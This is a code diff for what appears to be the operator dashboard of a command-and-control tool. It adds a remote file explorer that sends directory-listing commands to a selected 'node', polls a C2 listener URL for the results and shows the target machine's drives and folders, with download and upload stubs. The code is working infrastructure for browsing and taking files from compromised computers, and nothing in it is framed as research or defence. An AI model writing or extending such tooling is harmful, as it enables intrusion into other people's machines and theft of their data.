@@ -19,6 +19,13 @@ let streamInterval = null;
 let activeStream = { type: null, monitor: 0 };
 const STREAM_POLL_RATE = 3000; // Poll every 3 seconds
 
+// --- NEW: Filesystem State ---
+let fsPollInterval = null;
+let currentFsPath = null;
+const FS_POLL_RATE = 2000; // Poll every 2 seconds
+const FS_POLL_TIMEOUT = 20000; // Stop polling after 20 seconds
+
+
 // ==========================================
 // INITIALIZATION
 // ==========================================
@@ -532,25 +539,174 @@ window.openFileSystem = function() {
     modal.classList.remove('hidden');
     setTimeout(() => modal.classList.add('visible'), 10);
     
-    const tbody = document.getElementById('fsTbody');
-    tbody.innerHTML = `
-        <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors">
-            <td class="p-3 text-center"><i class="fa-solid fa-triangle-exclamation text-yellow-500"></i></td>
-            <td class="p-3 font-bold text-gray-300">File System Offline</td>
-            <td class="p-3 text-right text-gray-400"></td>
-            <td class="p-3 text-right text-gray-500 text-xs"></td>
-            <td class="p-3 text-center"></td>
-        </tr>
-    `;
-    termLog("File Explorer initialized. Awaiting directory listing capability.");
+    requestDirectoryListing('DRIVES');
+    termLog("File Explorer initialized. Requesting drive listing...");
 };
 
+function requestDirectoryListing(path) {
+    if (fsPollInterval) clearInterval(fsPollInterval);
+
+    currentFsPath = path;
+    updateBreadcrumbs(path);
+    
+    const tbody = document.getElementById('fsTbody');
+    tbody.innerHTML = `
+        <tr class="border-b border-gray-800/60">
+            <td colspan="5" class="p-8 text-center text-gray-400 font-mono">
+                <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl"></i>
+                <p class="mt-2 text-sm">Requesting listing for "${path}"...</p>
+            </td>
+        </tr>
+    `;
+
+    sendCommandToNode(activeNodeId, `LIST_DIR:${path}`);
+
+    const pollStartTime = Date.now();
+    fsPollInterval = setInterval(async () => {
+        if (Date.now() - pollStartTime > FS_POLL_TIMEOUT) {
+            clearInterval(fsPollInterval);
+            fsPollInterval = null;
+            tbody.innerHTML = `<tr class="border-b border-gray-800/60"><td colspan="5" class="p-8 text-center text-red-500 font-mono">Request timed out. The node may be offline or unresponsive.</td></tr>`;
+            return;
+        }
+
+        try {
+            const response = await fetch(`${C2_LISTENER_URL}/fs/${activeNodeId}`, {
+                headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
+            });
+            
+            if (response.ok) {
+                clearInterval(fsPollInterval);
+                fsPollInterval = null;
+                const data = await response.json();
+                renderFileSystem(data);
+            }
+        } catch (e) {
+            console.error("FS poll error:", e);
+        }
+    }, FS_POLL_RATE);
+}
+
+function renderFileSystem(data) {
+    const tbody = document.getElementById('fsTbody');
+    tbody.innerHTML = '';
+
+    if (data.error) {
+        tbody.innerHTML = `<tr class="border-b border-gray-800/60"><td colspan="5" class="p-8 text-center text-red-500 font-mono"><i class="fa-solid fa-triangle-exclamation mr-2"></i>Error on target: ${escapeHtml(data.error)}</td></tr>`;
+        return;
+    }
+    
+    if (!data.contents || data.contents.length === 0) {
+        tbody.innerHTML = `<tr class="border-b border-gray-800/60"><td colspan="5" class="p-8 text-center text-gray-500 font-mono">This directory is empty.</td></tr>`;
+        return;
+    }
+
+    data.contents.sort((a, b) => {
+        if (a.type === b.type) return a.name.localeCompare(b.name, undefined, {numeric: true});
+        return a.type === 'directory' || a.type === 'drive' ? -1 : 1;
+    });
+
+    data.contents.forEach(item => {
+        let icon, color, action;
+        const fullPath = (data.path === 'DRIVES' ? item.name : `${data.path.replace(/\\$/, '')}\\${item.name}`).replace(/\\/g, '\\\\');
+
+        switch (item.type) {
+            case 'drive':
+                icon = 'fa-hdd'; color = 'text-gray-400';
+                action = `onclick="requestDirectoryListing('${fullPath}')"`;
+                break;
+            case 'directory':
+                icon = 'fa-folder'; color = 'text-yellow-500';
+                action = `onclick="requestDirectoryListing('${fullPath}')"`;
+                break;
+            case 'file':
+                icon = 'fa-file-lines'; color = 'text-cyberBlue';
+                action = `onclick="showToast('File actions not yet implemented.')"`;
+                break;
+            default:
+                icon = 'fa-ban'; color = 'text-red-600';
+                action = `title="Permission Denied"`;
+                break;
+        }
+
+        const size = item.size > 0 ? formatBytes(item.size) : '';
+        const modified = item.modified > 0 ? new Date(item.modified * 1000).toLocaleString() : 'N/A';
+
+        const row = document.createElement('tr');
+        row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
+        row.innerHTML = `
+            <td class="p-3 text-center ${color}"><i class="fa-regular ${icon}"></i></td>
+            <td class="p-3 font-bold text-gray-300" ${action}>${escapeHtml(item.name)}</td>
+            <td class="p-3 text-right text-gray-400">${size}</td>
+            <td class="p-3 text-right text-gray-500 text-xs">${modified}</td>
+            <td class="p-3 text-center">
+                <button class="text-gray-600 hover:text-white text-xs" onclick="event.stopPropagation(); showToast('Download not yet implemented.')"><i class="fa-solid fa-download"></i></button>
+            </td>
+        `;
+        tbody.appendChild(row);
+    });
+}
+
+function updateBreadcrumbs(path) {
+    const container = document.getElementById('fsBreadcrumbs');
+    container.innerHTML = '';
+    if (!path || path === 'DRIVES') {
+        container.innerHTML = `<span class="text-gray-500">Drives</span>`;
+        return;
+    }
+
+    const parts = path.split('\\').filter(p => p);
+    let currentPath = '';
+    parts.forEach((part, index) => {
+        currentPath += part + '\\\\';
+        const isLast = index === parts.length - 1;
+        if (isLast) {
+            container.innerHTML += `<span class="text-white font-bold">${escapeHtml(part)}</span>`;
+        } else {
+            container.innerHTML += `<span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span><span class="text-gray-600 mx-1">/</span>`;
+        }
+    });
+}
+
+function formatBytes(bytes, decimals = 2) {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const dm = decimals < 0 ? 0 : decimals;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+}
+
 window.closeFileSystem = function() {
+    if (fsPollInterval) clearInterval(fsPollInterval);
+    fsPollInterval = null;
+    currentFsPath = null;
     const modal = document.getElementById('fileExplorerModal');
     modal.classList.remove('visible');
     setTimeout(() => modal.classList.add('hidden'), 300);
 };
-window.navigateUp = function() { showToast('Awaiting live target connection.'); };
+
+window.navigateUp = function() {
+    if (!currentFsPath || currentFsPath === 'DRIVES') {
+        requestDirectoryListing('DRIVES');
+        return;
+    }
+    if (currentFsPath.endsWith(':\\') && currentFsPath.length === 3) {
+        requestDirectoryListing('DRIVES');
+        return;
+    }
+    const lastSlash = currentFsPath.replace(/\\$/, '').lastIndexOf('\\');
+    if (lastSlash === -1) {
+        requestDirectoryListing('DRIVES');
+    } else if (lastSlash === 2 && currentFsPath[1] === ':') {
+        let parentPath = currentFsPath.substring(0, lastSlash + 1);
+        requestDirectoryListing(parentPath);
+    } else {
+        let parentPath = currentFsPath.substring(0, lastSlash);
+        requestDirectoryListing(parentPath);
+    }
+};
+
 window.triggerUpload = function() { document.getElementById('fileUploadInput').click(); };
 document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.files[0]) showToast(`Upload queued: ${e.target.files[0].name}`); };
 
